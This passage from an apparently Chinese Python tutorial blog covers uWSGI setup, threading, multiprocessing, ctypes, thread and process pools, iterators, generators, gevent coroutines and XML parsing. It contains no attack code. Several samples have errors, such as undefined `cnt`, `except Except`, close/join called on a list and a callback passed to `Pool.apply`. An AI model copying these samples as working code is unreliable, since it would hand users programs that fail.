<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># --processes 添加更多的进程，用于并发</span><br><span class="line"># --threads 添加更多的线程，用于并发</span><br><span class="line"># --stats 使用 stats 子系统，可以执行监控任务 (uwsgitop)</span><br><span class="line"># --http-socket 启动地址，结合Nginx用</span><br><span class="line"># --wsgi-file 指定入口文件</span><br><span class="line"># --chdir 指定项目目录，如Django项目目录</span><br><span class="line">uwsgi --http-socket 127.0.0.1:3031 --chdir /home/foobar/myproject/ --wsgi-file myproject/wsgi.py --master --processes 4 --threads 2 --stats 127.0.0.1:9191</span><br></pre></td></tr></table></figure>

<p>也可以写成配置文件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[uwsgi]</span><br><span class="line">socket = 127.0.0.1:3031</span><br><span class="line">chdir = /home/foobar/myproject/</span><br><span class="line">wsgi-file = myproject/wsgi.py</span><br><span class="line">processes = 4</span><br><span class="line">threads = 2</span><br><span class="line">stats = 127.0.0.1:9191</span><br></pre></td></tr></table></figure>

<p>接着执行：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uwsgi yourfile.ini</span><br></pre></td></tr></table></figure>

<p>如果不用Django框架，而是单独文件<code>server.py</code>，或是Flask框架：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># uWSGI Python 加载器将会搜索的默认函数 application </span><br><span class="line">def application(env, start_response):</span><br><span class="line">    start_response(&#x27;200 OK&#x27;, [(&#x27;Content-Type&#x27;,&#x27;text/html&#x27;)])</span><br><span class="line">    return [b&quot;Hello World&quot;]</span><br></pre></td></tr></table></figure>

<h2 id="多线程"><a href="#多线程" class="headerlink" title="多线程"></a>多线程</h2><p>Python代码的执行由Python虚拟机（也叫解释器主循环）来控制。Python在设计之初就考虑到要在主循环中，同时只有一个线程在执行。虽然 Python 解释器中可以“运行”多个线程，但在任意时刻只有一个线程在解释器中运行。对Python虚拟机的访问由全局解释器锁(GIL)来控制，正是这个锁能保证同一时刻只有一个线程在运行。也就是说，<strong>尽管有了线程模块，Python几乎依然是单线程处理</strong>。</p>
<p>尽管如此，在IO密集型的多线程应用中，Python的多线程threading库表现却依然还行。但在并行计算型应用中，如果想真正实现多线程，就得在Python中可以使用多线程threading，并自行设计锁结构，或使用多进程multiprocessing，并在主进程设置消息队列，共享内存，管道等方式传递数据。</p>
<h3 id="threading-模块"><a href="#threading-模块" class="headerlink" title="threading 模块"></a>threading 模块</h3><p>创建线程，可以直接使用：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from threading import Thread</span><br><span class="line">import time</span><br><span class="line">def sayhi(name):</span><br><span class="line">    time.sleep(2)</span><br><span class="line">    print(&#x27;%s say hello&#x27; %name)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    t=Thread(target=sayhi,args=(&#x27;egon&#x27;,))</span><br><span class="line">    t.start()</span><br><span class="line">    print(&#x27;主线程&#x27;)</span><br><span class="line">    threading.enumerate() # 所有线程列表</span><br></pre></td></tr></table></figure>

<p>也可以通过子类继承后使用：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from threading import Thread</span><br><span class="line">import time</span><br><span class="line">class Sayhi(Thread):</span><br><span class="line">    def __init__(self,name):</span><br><span class="line">        super().__init__()</span><br><span class="line">        self.name=name</span><br><span class="line">    def run(self):</span><br><span class="line">        time.sleep(2)</span><br><span class="line">        print(&#x27;%s say hello&#x27; % self.name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    t = Sayhi(&#x27;egon&#x27;)</span><br><span class="line">    t.start()</span><br><span class="line">    print(&#x27;主线程&#x27;)</span><br></pre></td></tr></table></figure>

<p>Thead 对象的常用方法有：</p>
<ul>
<li>isAlive()：是否运行</li>
<li>getName()：获取线程名称</li>
<li>setName()：设置线程名称</li>
<li>x.join()：当前线程等待x线程结束再继续执行。</li>
<li>setDaemon(True)：设置为守护线程</li>
</ul>
<p><strong>守护线性</strong>：如果设置一个线程为守护线程，就表示这个线程是不重要的，在进程退出的时候，不用等待这个线程退出。主线程只会等待所有非守护线程都结束后才退出。</p>
<p>threading 模块的常用方法有：</p>
<ul>
<li>threading.currentThread(): 返回当前的线程变量。</li>
<li>threading.enumerate(): 返回一个包含正在运行的线程的list。正在运行指线程启动后、结束前，不包括启动前和终止后的线程。</li>
<li>threading.activeCount(): 返回正在运行的线程数量，与len(threading.enumerate())有相同的结果。</li>
</ul>
<p>使用 <strong>同步锁</strong> 可以防止数据竞争问题：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">R = threading.Lock()</span><br><span class="line">R.acquire()</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">临界区</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">R.release()</span><br></pre></td></tr></table></figure>

<p>但是使用锁的时候，一定要解决好死锁的问题。解决方法可以参考《操作系统》相关章节。</p>
<p>线程间通信，可以使用消息队列，可以使用共享内存的方式进行通信。下面使用队列方式通信（注意互斥访问队列）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># JoinableQueue</span><br><span class="line"># 队列长度，多线程下不够准确</span><br><span class="line">Queue.qsize()</span><br><span class="line"># 队列判空</span><br><span class="line">Queue.empty()</span><br><span class="line"># 队列判满</span><br><span class="line">Queue.full()</span><br><span class="line"># 入队，是否阻塞</span><br><span class="line">Queue.put(item, block=True, timeout=None)</span><br><span class="line"># 入队，不阻塞</span><br><span class="line">Queue.put_nowait(item)</span><br><span class="line"># 出队，是否阻塞</span><br><span class="line">Queue.get(block=True, timeout=None)</span><br><span class="line"># 出队，不阻塞</span><br><span class="line">Queue.get_nowait()</span><br><span class="line"># 提示让出队列，提示join停止阻塞</span><br><span class="line">Queue.task_done()</span><br><span class="line"># 阻塞直到队列为空</span><br><span class="line">Queue.join()</span><br></pre></td></tr></table></figure>

<h3 id="multiprocessing-模块"><a href="#multiprocessing-模块" class="headerlink" title="multiprocessing 模块"></a>multiprocessing 模块</h3><p>多进程的创建：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from multiprocessing import Process</span><br><span class="line">import os</span><br><span class="line">def work():</span><br><span class="line">    print(&#x27;hello&#x27;,os.getpid())</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    # 会发现每一个进程都有不同的 PID</span><br><span class="line">    # 且进程的数据各自保留一份，互不相关</span><br><span class="line">    # 之间传递数据必须使用工具</span><br><span class="line">    p1=Process(target=work)</span><br><span class="line">    p2=Process(target=work)</span><br><span class="line">    p1.start()</span><br><span class="line">    p2.start()</span><br><span class="line">    print(&#x27;主线程/主进程pid&#x27;,os.getpid())</span><br></pre></td></tr></table></figure>

<p>创建共享内存实现主进程与子进程通信：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import multiprocessing</span><br><span class="line"> </span><br><span class="line">def f(a):</span><br><span class="line">    a[0] = 5</span><br><span class="line"></span><br><span class="line"># 创建共享内存</span><br><span class="line">arr = multiprocessing.Array(&#x27;i&#x27;, range(10))</span><br><span class="line"># 子进程处理</span><br><span class="line">p = multiprocessing.Process(target=f, args=(arr,))</span><br><span class="line">p.start()</span><br><span class="line">p.join()</span><br><span class="line">print(arr[0])</span><br></pre></td></tr></table></figure>

<p>使用Manger通信，本质也是共享内存：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import multiprocessing</span><br><span class="line"></span><br><span class="line">def f(ls):</span><br><span class="line">    ls.append(&#x27;Hello&#x27;)</span><br><span class="line"></span><br><span class="line"># Manager 要在主进程创建</span><br><span class="line">server = multiprocessing.Manager()</span><br><span class="line"># 每调用一次list产生一个共享内存</span><br><span class="line"># 除了list外，也可以是其他形式，如队列、锁、字典、数组等</span><br><span class="line">ls = server.list()</span><br><span class="line"># ls = server.Queue()</span><br><span class="line"># 子进程处理</span><br><span class="line">proc = multiprocessing.Process(target=f, args=(ls,))</span><br><span class="line">proc.start()</span><br><span class="line">proc.join()</span><br><span class="line">print(ls)</span><br></pre></td></tr></table></figure>

<p>多进程间通过队列通信：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import multiprocessing</span><br><span class="line">from multiprocessing import Queue</span><br><span class="line"></span><br><span class="line">que = Queue(3)  # 队列容量 3</span><br><span class="line">que.put(&quot;msg 1&quot;)</span><br><span class="line">que.put(&quot;msg 2&quot;)</span><br><span class="line">que.full()  # False</span><br><span class="line">que.put(&quot;msg 3&quot;)</span><br><span class="line">que.full()  # True</span><br><span class="line">que.empty()  # False</span><br><span class="line"></span><br><span class="line">def fun(que):</span><br><span class="line">    d = que.get()</span><br><span class="line"></span><br><span class="line">p1 = multiprocessing.Process(target=fun, args=(que,))</span><br></pre></td></tr></table></figure>

<p>进程池：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import multiprocessing</span><br><span class="line">from multiprocessing import Pool</span><br><span class="line"></span><br><span class="line">def fun(arg):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">pool = Pool(3)  # 进程容量 3</span><br><span class="line">for i in range(10):</span><br><span class="line">    pool.apply_async(fun, (arg,))  # 添加任务</span><br><span class="line"></span><br><span class="line">pool.close()  # 关闭，不再接受新请求</span><br><span class="line">pool.join()   # 等待退出，必须在close之后</span><br></pre></td></tr></table></figure>

<h3 id="ctypes"><a href="#ctypes" class="headerlink" title="ctypes"></a>ctypes</h3><p>ctypes可以让Python直接调用任意的C动态库的导出函数，由于ctypes会在调用C函数前释放GIL，因此也可以实现多线程。</p>
<p>我们可以将写好的Task编译为C的动态库，例如<code>lib_task.so</code>或<code>lib_task.dll</code>，然后在Python中调用该库。打包动态库可以使用Visual Studio建立相关项目，Visual Studio就会自动生成一个DLL模板。或使用GCC创建：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lib_task.h</span><br><span class="line">#ifndef LIB_TASK_H</span><br><span class="line">#define LIB_TASK_H</span><br><span class="line"></span><br><span class="line">#ifdef __cplusplus</span><br><span class="line">extern &quot; C &quot; &#123;</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">// DLL 关键字 __declspec (dllexport)</span><br><span class="line">extern __declspec (dllexport) void Task(int arg);</span><br><span class="line"></span><br><span class="line">#ifdef __cplusplus</span><br><span class="line">&#125;</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">#endif</span><br><span class="line">lib_task.c</span><br><span class="line">#include &quot;print.h&quot;</span><br><span class="line"></span><br><span class="line">// 在这里实现多线程</span><br><span class="line">void Task(int arg)</span><br><span class="line">&#123;</span><br><span class="line">    while(arg);</span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编辑DLL：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc --share lib_task.c -o lib_task.dll</span><br><span class="line">from ctypes import *</span><br><span class="line">from threading import Thread</span><br><span class="line"></span><br><span class="line"># lib_task.h 与 lib_task.dll 必须在这个目录下</span><br><span class="line"># 给DLL传递参数时，要将参数转化为C的类型</span><br><span class="line">lib = cdll.LoadLibrary(&quot;lib_task.dll&quot;)</span><br><span class="line">t = Thread(target=lib.Task, args=(1,))</span><br><span class="line">t.start()</span><br><span class="line"></span><br><span class="line">lib.Task()</span><br></pre></td></tr></table></figure>

<h3 id="线程池"><a href="#线程池" class="headerlink" title="线程池"></a>线程池</h3><p>线程池可以帮助我们自动调度线程，在需要多线程任务量巨大的情况下是非常好用的工具，省去我们考虑线程同步的问题，也节省了上下文切换的时间。</p>
<p>第三方线程池 threadpool：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install threadpool</span><br><span class="line">from threadpool import ThreadPool, makeRequests</span><br><span class="line"></span><br><span class="line"># 创建一个容纳4个线程的线程池</span><br><span class="line">pool = ThreadPool(4)</span><br><span class="line">requests = makeRequests(</span><br><span class="line">    some_callable,   # 多线程的任务</span><br><span class="line">    list_of_args,    # 参数</span><br><span class="line">    callback         # 回调函数，可空</span><br><span class="line">    )</span><br><span class="line">for req in requests:</span><br><span class="line">    pool.putRequest(req) </span><br><span class="line"># 等待线程池完成任务</span><br><span class="line">pool.wait()</span><br></pre></td></tr></table></figure>

<p>另外还有ThreadPoolExecutor，ProcessPoolExecutor，线程（进程）池也可以使用。</p>
<p>Executor提供了以下常用的方法：</p>
<p><code>submit(fn, *args,**kwargs)</code>：将fn函提交给池子；*args是传给fn函数的参数；**kwargs表示以关键字的形式为fn的参数。</p>
<p><code>map(func, *iterables, timeout=None, chunksize=1)</code>：类似于全局函数的map，只是该函数将会启动多个线程，以异步的方式立即对*iterables执行map处理，就是把for循环和submit结合在一起了。</p>
<p><code>shutdown(wait=True)</code>：关闭池子，wait&#x3D;True时等待池内所有任务执行完毕回收完资源后才继续；wait&#x3D;False时立即返回，并不会等待池内的任务执行完毕；但不管wait参数为何值，整个程序都会等到所有任务执行完毕才会清空池子，所以submit和map必须在shutdown之前执行。</p>
<p>程序将task函数submit之后，submit会返回一个Future对象，Future类主要用于获取线程或进程任务函数的返回值。Future中提供了一下方法：</p>
<p><code>cancel()</code>：取消Future代表的线程或者进程任务，如果任务正在执行，不可取消，返回False；否则任务取消，返回Ture。</p>
<p><code>cancelled()</code>：返回Future代表的任务是否被成功取消。</p>
<p><code>running()</code>：返回Future代表的任务是否增正在执行。</p>
<p><code>done()</code>：返回Future代表的任务是否已经结束。</p>
<p><code>result(timmeout=None)</code>：返回Future代表的任务的结果，如果任务没有完成，该方法将会阻塞当前线程，timeout指定阻塞多长时间。</p>
<p><code>exception()</code>：返回Future代表的任务的异常，如果没有异常，则返回None。</p>
<p><code>add_done_callback(fn)</code>：给Future代表的任务加一个’回调函数’，当该任务成功之后，执行这个fn函数。</p>
<p>创建线程池 ThreadPoolExecutor：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import time,threading</span><br><span class="line">from concurrent.futures import ThreadPoolExecutor</span><br><span class="line"></span><br><span class="line">def f(n):</span><br><span class="line">    time.sleep(2)</span><br><span class="line">    print(f&quot;线程号 &#123;threading.get_ident()&#125;&quot;,n)</span><br><span class="line">    return n*n</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    # 创建线程池，线程数 5</span><br><span class="line">    t_pool = ThreadPoolExecutor(max_workers=5)</span><br><span class="line">    t_l = list()</span><br><span class="line">    for i in range(1,5):</span><br><span class="line">        t = t_pool.submit(f,i)</span><br><span class="line">        t_l.append(t)</span><br><span class="line">    t_pool.shutdown()</span><br><span class="line">    for i in t_l:</span><br><span class="line">        print(&#x27;===&#x27;,i.result())</span><br></pre></td></tr></table></figure>

<p>创建进程池 ProcessPoolExecutor：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import time,threading</span><br><span class="line">from concurrent.futures import ProcessPoolExecutor</span><br><span class="line"></span><br><span class="line">def callback_fun(x):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">def f(n):</span><br><span class="line">    time.sleep(2)</span><br><span class="line">    print(f&quot;进程PID &#123;os.getpid()&#125;&quot;,n)</span><br><span class="line">    return n*n</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    # 创建进程池，进程数 5</span><br><span class="line">    p_pool = ProcessPoolExecutor(max_workers=5)</span><br><span class="line">    p_l = list()</span><br><span class="line">    for i in range(5):</span><br><span class="line">        t = p_pool.submit(f,i)</span><br><span class="line">        # 也可以设置回调函数，回调的参数由任务函数提供</span><br><span class="line">        # t.add_done_callback(callback_fun)</span><br><span class="line">        p_l.append(t)</span><br><span class="line">    # 也可以写成</span><br><span class="line">    # s = p_pool.map(f,range(1,5))   </span><br><span class="line">    p_pool.shutdown(wait = True)</span><br><span class="line">    for i in p_l:</span><br><span class="line">        print(&#x27;===&#x27;,i.result())</span><br></pre></td></tr></table></figure>

<p>multiprocessing 模块也提供了进程池：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import os,time</span><br><span class="line">from multiprocessing import Process,Pool</span><br><span class="line"></span><br><span class="line">def f(n):</span><br><span class="line">    print(f&quot;进程PID &#123;os.getpid()&#125;&quot;)</span><br><span class="line">    time.sleep(1)</span><br><span class="line">    return n*n  # 返回值交给回调函数</span><br><span class="line"></span><br><span class="line">def cb_fun(n):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    # 创建工作进程</span><br><span class="line">    p = Pool(3)  </span><br><span class="line">    p_l = list()</span><br><span class="line">    for i in range(1,10):</span><br><span class="line">        re = p.apply(</span><br><span class="line">            f,              # 多线程工作函数</span><br><span class="line">            args=(i,),      # 传递的参数</span><br><span class="line">            callback=cb_fun # 回调函数</span><br><span class="line">        )</span><br><span class="line">        p_l.append(re)</span><br><span class="line">    print(p_l)</span><br><span class="line">    p_l.close()</span><br><span class="line">    p_l.join()</span><br></pre></td></tr></table></figure>

<h3 id="迭代器-1"><a href="#迭代器-1" class="headerlink" title="迭代器"></a>迭代器</h3><p>迭代器：可以节省内存空间，用每步生成的方式代替查表的方式。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from collections import Iterable</span><br><span class="line"></span><br><span class="line">isinstance(&quot;abc&quot;, Iterable)  # 可迭代类型</span><br><span class="line"></span><br><span class="line">class Student(object):</span><br><span class="line">    names = []</span><br><span class="line">    def __iter__(self):</span><br><span class="line">        return StudentIterator(self)</span><br><span class="line"></span><br><span class="line">class StudentIterator(object):</span><br><span class="line">    def __init__(self, obj):</span><br><span class="line">        self.obj = obj</span><br><span class="line">        self.cnt = 0</span><br><span class="line">    def __next__(self):</span><br><span class="line">        if cnt &gt; len(self.obj.names):</span><br><span class="line">            raise StopIteration  # 告诉 for 已经迭代完毕</span><br><span class="line">        self.cnt += 1</span><br><span class="line">        return self.obj.names[0]</span><br><span class="line">    def __iter__(self):</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line"># 也可以合并为一个类</span><br><span class="line">class Fibonacci(object):</span><br><span class="line">    def __init__(self, all_num):</span><br><span class="line">        self.all_num = all_num</span><br><span class="line">        self.cnt = 0</span><br><span class="line">        self.a = 0</span><br><span class="line">        self.b = 1</span><br><span class="line">    def __iter__(self):</span><br><span class="line">        return self</span><br><span class="line">    def __next__(self):</span><br><span class="line">        if cnt &gt;= all_num:</span><br><span class="line">            raise StopIteration  # 告诉 for 已经迭代完毕</span><br><span class="line">        self.cnt += 1</span><br><span class="line">        self.a, self.b = self.b, self.a + self.b</span><br><span class="line">        return self.b</span><br><span class="line">    </span><br><span class="line">fib = Fibonacci(10)</span><br><span class="line">for x in fib:</span><br><span class="line">    print(x)</span><br></pre></td></tr></table></figure>

<p>对于如下代码，执行步骤为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for item in obj: ...</span><br></pre></td></tr></table></figure>

<ol>
<li>判断obj是否是迭代类型（是否有<code>__iter__</code>方法）；</li>
<li>调用<code>__iter__</code>方法得到迭代器，获取<code>__iter__</code>的返回值（返回了一个迭代器）。</li>
<li>每for一次，调用一次<code>__next__</code></li>
</ol>
<p>迭代器实例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">range(10)   # 直接生成数据</span><br><span class="line">xrange(10)  # 底层为迭代器，可以节省内存</span><br></pre></td></tr></table></figure>

<h3 id="生成器"><a href="#生成器" class="headerlink" title="生成器"></a>生成器</h3><p>生成器是一种特殊的迭代器。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 普通方式创建数组</span><br><span class="line">nums = [x for x in range(10)]</span><br><span class="line"># 生成器方式，节省空间</span><br><span class="line">nums = (x for x in range(10))</span><br><span class="line"># 迭代生成器</span><br><span class="line">for x in nums:</span><br><span class="line">    print(x)</span><br></pre></td></tr></table></figure>

<p>将函数变为生成器：只要函数中包含<code>yield</code>即可，此时调用函数，得到一个生成器。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def fib(n):</span><br><span class="line">    a, b = 0, 1</span><br><span class="line">    cnt = 0</span><br><span class="line">    while cnt &lt; n:</span><br><span class="line">        yield a</span><br><span class="line">        a, b = b, a + b</span><br><span class="line">        cnt += 1</span><br><span class="line">    # return 可有可无</span><br><span class="line">    return &quot;over&quot;</span><br><span class="line"></span><br><span class="line">obj = fib(10)  # 得到生成器</span><br><span class="line">for x in obj:</span><br><span class="line">    print(x)</span><br><span class="line"></span><br><span class="line">obj2 = fib(4)</span><br><span class="line">while True:</span><br><span class="line">    try:</span><br><span class="line">        ret = next(obj2)</span><br><span class="line">    except Except as ex:</span><br><span class="line">        print(ex.value)  # 此处存储 fib 的 return</span><br><span class="line">        break</span><br></pre></td></tr></table></figure>

<p>通过<code>send</code>方法启动生成器：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def fib(n):</span><br><span class="line">    a, b = 0, 1</span><br><span class="line">    cnt = 0</span><br><span class="line">    while cnt &lt; n:</span><br><span class="line">        ret = yield a  # 此处 ret 接收 send 方法给的值</span><br><span class="line">        a, b = b, a + b</span><br><span class="line">        cnt += 1</span><br><span class="line"></span><br><span class="line">obj = fib(10)</span><br><span class="line">ret = next(obj)       # 启动生成器 得到第一个元素 给 ret</span><br><span class="line">ret = obj.send(&quot;xx&quot;)  # 给 生成器 中的 ret 传递值 xx</span><br><span class="line">print(ret)</span><br><span class="line"></span><br><span class="line"># 注：send 必须在 next 之后执行；要么在next之前执行，传递 None</span><br></pre></td></tr></table></figure>

<h3 id="协程"><a href="#协程" class="headerlink" title="协程"></a>协程</h3><p><code>greenlet</code> 模块：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from greenlet import greenlet</span><br><span class="line"></span><br><span class="line">def fun1():</span><br><span class="line">    ...</span><br><span class="line">    gr2.switch()</span><br><span class="line">    ...</span><br><span class="line">    pass</span><br><span class="line">def fun2():</span><br><span class="line">    ...</span><br><span class="line">    gr1.switch()</span><br><span class="line">    ...</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">g1 = greenlet(fun1)</span><br><span class="line">g2 = greenlet(fun2)</span><br><span class="line"></span><br><span class="line">g1.switch()  # 切入 fun1 运行</span><br></pre></td></tr></table></figure>

<p><code>gevent</code> 模块：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import gevent</span><br><span class="line"></span><br><span class="line">def fun(n):</span><br><span class="line">    for i in range(n):</span><br><span class="line">        print(gevent.getcurrent(), i)</span><br><span class="line">        gevent.sleep(0.5)  # gevent 内部必须使用自己的延时等待</span><br><span class="line"></span><br><span class="line">g1 = gevent.spawn(fun, 5)  # 创建协程 函数 fun 参数 5</span><br><span class="line">g2 = gevent.spawn(fun, 5)</span><br><span class="line">g3 = gevent.spawn(fun, 5)</span><br><span class="line"></span><br><span class="line">g1.join()</span><br><span class="line">g2.join()</span><br><span class="line">g3.join()</span><br></pre></td></tr></table></figure>

<p>给代码打补丁升级：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import gevent</span><br><span class="line">from gevent import monkey</span><br><span class="line"></span><br><span class="line">monkey.patch_all()  # 打补丁，临时改写代码</span><br><span class="line"></span><br><span class="line">def fun(n):</span><br><span class="line">    for i in range(n):</span><br><span class="line">        print(gevent.getcurrent(), i)</span><br><span class="line">        time.sleep(0.5)  # 有了补丁，可以不必更改延时函数</span><br><span class="line"></span><br><span class="line"># 写法与上面的等效</span><br><span class="line">gevent.joinall([</span><br><span class="line">    gevent.spawn(fun, 5),</span><br><span class="line">    gevent.spawn(fun, 5)</span><br><span class="line">])</span><br></pre></td></tr></table></figure>

<h2 id="XML-与-JSON"><a href="#XML-与-JSON" class="headerlink" title="XML 与 JSON"></a>XML 与 JSON</h2><h3 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h3><p>XML 指可扩展标记语言（eXtensible Markup Language），形式同HTML，是一种用于标记电子文件使其具有结构性的标记语言。XML也可以用于数据以文本格式存储下来。格式如下（DOM）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;collection shelf=&quot;New Arrivals&quot;&gt;</span><br><span class="line">&lt;movie title=&quot;Enemy Behind&quot;&gt;</span><br><span class="line">   &lt;type&gt;War, Thriller&lt;/type&gt;</span><br><span class="line">   &lt;format&gt;DVD&lt;/format&gt;</span><br><span class="line">   &lt;year&gt;2003&lt;/year&gt;</span><br><span class="line">   &lt;rating&gt;PG&lt;/rating&gt;</span><br><span class="line">   &lt;stars&gt;10&lt;/stars&gt;</span><br><span class="line">   &lt;description&gt;Talk about a US-Japan war&lt;/description&gt;</span><br><span class="line">&lt;/movie&gt;</span><br><span class="line">&lt;movie title=&quot;Transformers&quot;&gt;</span><br><span class="line">   &lt;type&gt;Anime, Science Fiction&lt;/type&gt;</span><br><span class="line">   &lt;format&gt;DVD&lt;/format&gt;</span><br><span class="line">   &lt;year&gt;1989&lt;/year&gt;</span><br><span class="line">   &lt;rating&gt;R&lt;/rating&gt;</span><br><span class="line">   &lt;stars&gt;8&lt;/stars&gt;</span><br><span class="line">   &lt;description&gt;A schientific fiction&lt;/description&gt;</span><br><span class="line">&lt;/movie&gt;</span><br><span class="line">   &lt;movie title=&quot;Trigun&quot;&gt;</span><br><span class="line">   &lt;type&gt;Anime, Action&lt;/type&gt;</span><br><span class="line">   &lt;format&gt;DVD&lt;/format&gt;</span><br><span class="line">   &lt;episodes&gt;4&lt;/episodes&gt;</span><br><span class="line">   &lt;rating&gt;PG&lt;/rating&gt;</span><br><span class="line">   &lt;stars&gt;10&lt;/stars&gt;</span><br><span class="line">   &lt;description&gt;Vash the Stampede!&lt;/description&gt;</span><br><span class="line">&lt;/movie&gt;</span><br><span class="line">&lt;movie title=&quot;Ishtar&quot;&gt;</span><br><span class="line">   &lt;type&gt;Comedy&lt;/type&gt;</span><br><span class="line">   &lt;format&gt;VHS&lt;/format&gt;</span><br><span class="line">   &lt;rating&gt;PG&lt;/rating&gt;</span><br><span class="line">   &lt;stars&gt;2&lt;/stars&gt;</span><br><span class="line">   &lt;description&gt;Viewable boredom&lt;/description&gt;</span><br><span class="line">&lt;/movie&gt;</span><br><span class="line">&lt;/collection&gt;</span><br></pre></td></tr></table></figure>

<p>解析 XML 可以使用 SAX 模块，SAX 模块用事件驱动模型，通过在解析 XML 的过程中触发一个个的事件并调用用户定义的回调函数来处理 XML 文件。SAX 模块非常适用于对大型文件进行处理，且只需要文件部分信息时使用。</p>
<p>通过使用ContentHandler类读取数据。ContentHandler的方法有：</p>
<ul>
<li>startDocument()：文档启动时调用。</li>
<li>endDocument()：到达结尾时调用。</li>
<li>startElement(name, attrs)：遇到开始标签&lt;..&gt;调用。</li>
<li>endElement(name)：遇到结束标签&lt;&#x2F;..&gt;调用。</li>
<li>characters(content)：分情况看，有<ul>
<li>从行开始，遇到标签之前，若存在字符，则content的值为这些字符串。</li>
<li>从一个标签，遇到下一个标签之前，若存在字符，则content的值为这些字符串。</li>
<li>从一个标签，遇到行结束符之前，若存在字符，则content的值为这些字符串。</li>
<li>标签可以是开始标签，也可以是结束标签。</li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import xml.sax</span><br><span class="line"></span><br><span class="line">class MovieHandler( xml.sax.ContentHandler ):</span><br><span class="line">    def __init__(self):  # 此处定义对象属性</span><br><span class="line">        pass</span><br><span class="line">    # 元素开始调用</span><br><span class="line">    def startElement(self, tag, attributes):</span><br><span class="line">        pass</span><br><span class="line">    # 元素结束调用</span><br><span class="line">    def endElement(self, tag):</span><br><span class="line">        pass</span><br><span class="line">    # 读取字符时调用</span><br><span class="line">    def characters(self, content):</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line"># 创建XML阅读器</span><br><span class="line">parser = xml.sax.make_parser()</span><br><span class="line"># 关闭命名空间</span><br><span class="line">parser.setFeature(xml.sax.handler.feature_namespaces, 0)</span><br><span class="line"># 创建对象</span><br><span class="line">Handler = MovieHandler()</span><br><span class="line"># 设置XML阅读器</span><br><span class="line">parser.setContentHandler(Handler)</span><br><span class="line"># 开始解析</span><br><span class="line">parser.parse(&quot;movies.xml&quot;)</span><br></pre></td></tr></table></figure>

<p>如果解析的文件不大，且需要文件的全部信息，可以使用DOM解析器。这个解析器可以一次性将整个文档读入内存，且可读可写到文件。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from xml.dom.minidom import parse</span><br><span class="line">import xml.dom.minidom</span><br><span class="line"></span><br><span class="line"># 使用minidom解析器打开 XML 文档</span><br><span class="line">DOMTree = xml.dom.minidom.parse(&quot;movies.xml&quot;)</span><br><span class="line">collection = DOMTree.documentElement</span><br><span class="line">if collection.hasAttribute(&quot;shelf&quot;):</span><br><span class="line">   print (f&quot;Root element : &#123;collection.getAttribute(&#x27;shelf&#x27;)&#125;&quot;)</span><br><span class="line"></span><br><span class="line"># 在集合中获取所有电影</span><br><span class="line">movies = collection.getElementsByTagName(&quot;movie&quot;)</span><br></pre></td></tr></table></figure>

<h3 id="Json"><a href="#Json" class="headerlink" title="Json"></a>Json</h3><p>JSON (JavaScript Object Notation) 是一种轻量级的数据交换格式，适合于网络间传输数据，如前后端使用Ajax传输，则偏向于传输Json。</p>
